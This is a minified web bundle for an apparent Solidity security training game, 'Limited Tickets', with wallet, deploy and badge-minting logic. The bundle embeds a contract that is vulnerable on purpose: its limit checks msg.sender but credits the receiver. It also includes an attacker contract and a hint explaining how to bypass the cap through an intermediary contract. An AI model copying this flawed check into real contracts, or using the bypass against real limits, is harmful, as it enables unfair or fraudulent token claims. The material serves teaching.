(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[805],{55971:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/games/Game16",function(){return n(80335)}])},83545:function(e,t,n){"use strict";var a=n(85893),s=n(67294),i=n(53637),c=n(39886),r=n(54610),o=n(84082),l=n(49816),d=n(89163),u=n(87261),m=n(45281),h=n(84283),p=n(74855),k=n(55678),x=n(96941);n(71399);var y=n(46050);t.Z=e=>{let{gameData:t,gameFunctions:n}=e,[g,f]=(0,s.useState)({}),[b,T]=(0,s.useState)(""),[j,C]=(0,s.useState)(""),[w,A]=(0,s.useState)(""),[N,Z]=(0,s.useState)(!1),[v,S]=(0,s.useState)(null),[E,_]=(0,s.useState)(null),[B,L]=(0,s.useState)(!1),[P,H]=(0,s.useState)(null),I=(0,s.useRef)(null),{walletAddress:F,factoryContract:M,nftContract:Y,web3:G}=(0,s.useContext)(y.S);(0,s.useEffect)(()=>{G&&G.utils.isAddress(b)&&S(new G.eth.Contract(t.abi,b)),G&&t.abi2&&G.utils.isAddress(j)&&_(new G.eth.Contract(t.abi2,j))},[b,j,G,t.abi,t.abi2]),(0,s.useEffect)(()=>{let e=async()=>{if(F&&Y){let e=await Y.methods.balanceOf(F,t.badgeId).call();A(e)}};e()},[F,Y,t.badgeId]);let O=(e,t)=>{f({...g,[t]:e.target.value})},D=async()=>{try{Z(!0);let e=await M.methods.deploy(t.id).send({from:F}),n=e.events.DeployInstance;n?(T(G.utils.toChecksumAddress("0x".concat(e.logs[0].topics[1].slice(-40)))),t.abi2&&e.logs[1]&&C(G.utils.toChecksumAddress("0x".concat(e.logs[1].topics[1].slice(-40)))),t.showTransactionHash&&H(e.transactionHash),k.Am.success("Game instance(s) created successfully!")):k.Am.error("Game creation failed.")}catch(e){k.Am.error("Game creation failed. Please ensure your wallet is connected."),console.error(e)}finally{Z(!1)}},z=(e,n)=>{n(k.Am,v,g,F,Y,t.badgeId,G,E)};return(0,a.jsxs)(i.Z,{className:"bg-primary-black overflow-hidden",style:{paddingBottom:"30px",minHeight:"100vh"},children:[(0,a.jsx)(x.wp,{}),(0,a.jsx)(k.Ix,{}),(0,a.jsx)("h1",{className:"game-title title-color",style:{paddingTop:"20px",paddingBottom:"20px"},children:(0,a.jsx)("b",{children:t.title})}),(0,a.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,a.jsx)(r.Z,{children:(0,a.jsxs)("div",{children:[(0,a.jsx)(p.CopyToClipboard,{text:t.code,children:(0,a.jsx)(o.Z,{className:"button-copy",children:"Copy code"})}),(0,a.jsx)(m.Z,{language:"javascript",style:h.YC,ref:I,customStyle:{margin:"0"},children:t.code})]})})}),t.code1&&(0,a.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,a.jsx)(r.Z,{children:(0,a.jsxs)("div",{children:[(0,a.jsx)(p.CopyToClipboard,{text:t.code1,children:(0,a.jsx)(o.Z,{className:"button-copy",children:"Copy code"})}),(0,a.jsx)(m.Z,{style:h.YC,ref:I,customStyle:{margin:"0"},children:t.code1})]})})}),(0,a.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,a.jsxs)(r.Z,{children:[(0,a.jsx)(l.Z,{className:"desc-title title-color",children:(0,a.jsx)("b",{children:"Game Description"})}),(0,a.jsx)("p",{children:t.description}),(0,a.jsx)("br",{}),(0,a.jsx)(o.Z,{onClick:D,className:"flex h-fit py-2 px-4 bg-[#25618B] rounded-[12px] gap-[6px]",style:{backgroundColor:"#c97539",color:"white"},children:N?"Creating...":"Create Instance"})]})}),b&&!N&&(0,a.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,a.jsxs)(r.Z,{children:[(0,a.jsx)("h3",{className:"desc-title title-color",children:(0,a.jsx)("b",{children:"Your Instance Address:"})}),(0,a.jsx)("p",{style:{wordBreak:"break-all",color:"#c97539"},children:b}),E&&(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("h3",{className:"desc-title title-color",children:(0,a.jsx)("b",{children:"Your Hacking Instance Address:"})}),(0,a.jsx)("p",{style:{wordBreak:"break-all",color:"#c97539"},children:j})]})]})}),b&&!N&&t.hint&&(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(o.Z,{onClick:()=>L(!B),className:"flex h-fit py-2 px-4 bg-[#25618B] rounded-[12px] gap-[6px]",style:{backgroundColor:"#355f7d",color:"white",marginBottom:"17px",marginLeft:"12px"},children:B?"Hide Hint":"Show Hint"}),B&&(0,a.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginTop:"10px"},children:(0,a.jsxs)(r.Z,{children:[(0,a.jsx)(l.Z,{className:"desc-title title-color",children:(0,a.jsx)("b",{children:"Hint"})}),(0,a.jsxs)("p",{children:[t.hint,t.showTransactionHash&&P&&(0,a.jsxs)("span",{style:{wordBreak:"break-all",color:"#c97539"},children:[" ",P,"."]}),t.hintLink&&(0,a.jsxs)("span",{children:[" You can read more ",(0,a.jsx)("a",{href:t.hintLink,target:"_blank",rel:"noopener noreferrer",style:{color:"#c97539"},children:"here"}),"."]}),t.hintLink2&&(0,a.jsxs)("span",{children:[" and ",(0,a.jsx)("a",{href:t.hintLink2,target:"_blank",rel:"noopener noreferrer",style:{color:"#c97539"},children:"here"}),"."]})]})]})})]}),b&&!N&&t.functions.map((e,t)=>(0,a.jsx)(c.Z,{className:"game-card",style:{backgroundColor:"#000000",color:"white",marginBottom:"20px"},children:(0,a.jsxs)(r.Z,{children:[(0,a.jsx)(l.Z,{className:"desc-title title-color",children:(0,a.jsx)("b",{children:e.label})}),e.inputs.map((e,t)=>(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(d.Z,{children:(0,a.jsx)(u.Z,{className:"py-1 rounded-[12px]",style:{color:"black"},placeholder:e.placeholder,onChange:t=>O(t,e.name)})},t),(0,a.jsx)("br",{})]})),(0,a.jsx)(o.Z,{className:"flex h-fit py-2 px-4 bg-[#25618B] rounded-[12px] gap-[6px]",style:{backgroundColor:"#355f7d",color:"white"},onClick:()=>z(e.functionName,n[e.functionName]),children:e.buttonText})]})},t)),w>0&&(0,a.jsx)("div",{style:{textAlign:"center",color:"#c97539",marginTop:"20px"},children:(0,a.jsxs)("strong",{children:["Congratulations! You Got A Badge ",(0,a.jsx)("i",{className:"fas fa-medal",style:{fontSize:"20px"}})]})})]})}},80335:function(e,t,n){"use strict";n.r(t),n.d(t,{default:function(){return h}});var a=n(85893);n(67294);var s=n(83545),i=JSON.parse('[{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"Count","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"ticketAmount","type":"uint256"}],"name":"claimTickets","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"maxTicketsPerAddress","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"}]'),c=JSON.parse('[{"inputs":[{"internalType":"address","name":"_target","type":"address"},{"internalType":"address","name":"attacker","type":"address"},{"internalType":"uint256","name":"ticketAmount","type":"uint256"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"}]');let r=async(e,t,n,a)=>{let{receiver:s,ticketAmount:i}=n;try{await t.methods.claimTickets(s,i).send({from:a}),e.success("Claiming was completed successfully!")}catch(t){console.error("Error in claimTickets function:",t),e.error("Claiming tickets failed.")}},o=async(e,t,n)=>{let{inputCounter:a}=n;try{let n=await t.methods.Count(a).call();e.info("Ticket Count for ".concat(a,": ").concat(n))}catch(t){console.error("Error in Count function:",t),e.error("Fetching ticket count failed.")}},l=async(e,t)=>{try{let n=await t.methods.maxTicketsPerAddress().call();console.log(n),e.info("Max Tickets Per Address: ".concat(n))}catch(t){console.error("Error in maxTicketsPerAddress function:",t),e.error("Fetching max tickets per address failed.")}},d=async(e,t,n,a,s,i,c,r)=>{let{target:o,attacker:l,ticketAmount:d}=n;try{await r.methods.attack(o,l,d).send({from:a}),e.success("Attack executed! ".concat(d," tickets attempted to claim."))}catch(t){console.error("Error in attack function:",t),e.error("Attack failed.")}},u=async(e,t,n,a,s,i)=>{try{let n=await t.methods.Count(a).call();if(n>3){e.success("Congratulations! You met the ticket requirement!");let n=await s.methods.balanceOf(a,i).call();n<1&&(await s.methods.mint(i,t.options.address).send({from:a}),e.success("Badge minted successfully!"))}else e.error("You don't have enough tickets.")}catch(t){console.error("Error in checkLimitedTickets function:",t),e.error("Checking limited tickets failed.")}},m={id:16,title:"Limited Tickets",description:"Strategize and bypass ticket limitations in Solidity. Challenge the system and claim rewards.\n                To play this game, you must creatively explore communication with the ticketing contract, \n                understanding how to potentially bypass a limitation that restricts users to three tickets. \n                Familiarity with intermediate contracts could prove valuable.",code:'// SPDX-License-Identifier: MIT\n          pragma solidity ^0.8.10;\n          \n          contract LimitedTickets {\n              mapping(address => uint256) public Count;\n              uint8 public maxTicketsPerAddress = 3;\n\n              function claimTickets(address receiver, uint256 ticketAmount) public {\n                  require(\n                      Count[msg.sender] + ticketAmount <= maxTicketsPerAddress,\n                      "max tickets per address exceeded"\n                  );\n                  for (uint256 i = 0; i < ticketAmount; i++) {\n                      Count[receiver]++;\n                  }\n              }\n          }\n          \n          contract HacklimitedTickets {\n              LimitedTickets target;\n\n              function attack(address _target, address attacker, uint256 ticketAmount) public {\n                  target = LimitedTickets(_target);\n                  target.claimTickets(attacker, ticketAmount);\n              }\n          }',abi:i,abi2:c,badgeId:16,hint:"Consider how the 'claimTickets' function tracks ticket count. When the attacker contract calls this function, \n         it's defined as the msg.sender. Even though the tickets are transferred to your address through the attacker contract, \n         the balance of the attacker contract will always remain at zero tickets.",functions:[{label:"Count Tickets",functionName:"Count",buttonText:"Fetch Ticket Count",inputs:[{name:"inputCounter",placeholder:"Enter Address"}]},{label:"Max Tickets Per Address",functionName:"maxTicketsPerAddress",buttonText:"Fetch Max Tickets",inputs:[]},{label:"Claim Tickets",functionName:"claimTickets",buttonText:"Claim Tickets",inputs:[{name:"receiver",placeholder:"Enter Receiver Address"},{name:"ticketAmount",placeholder:"Enter Ticket Amount"}]},{label:"Hack Limited Tickets",functionName:"attack",buttonText:"Perform Attack",inputs:[{name:"target",placeholder:"Enter Target Address"},{name:"attacker",placeholder:"Enter Attacker Address"},{name:"ticketAmount",placeholder:"Enter Ticket Amount"}]},{label:"Check Limited Tickets",functionName:"checkLimitedTickets",buttonText:"Submit",inputs:[]}]};var h=()=>(0,a.jsx)(s.Z,{gameData:m,gameFunctions:{claimTickets:r,Count:o,maxTicketsPerAddress:l,attack:d,checkLimitedTickets:u}})}},function(e){e.O(0,[931,318,941,774,888,179],function(){return e(e.s=55971)}),_N_E=e.O()}]);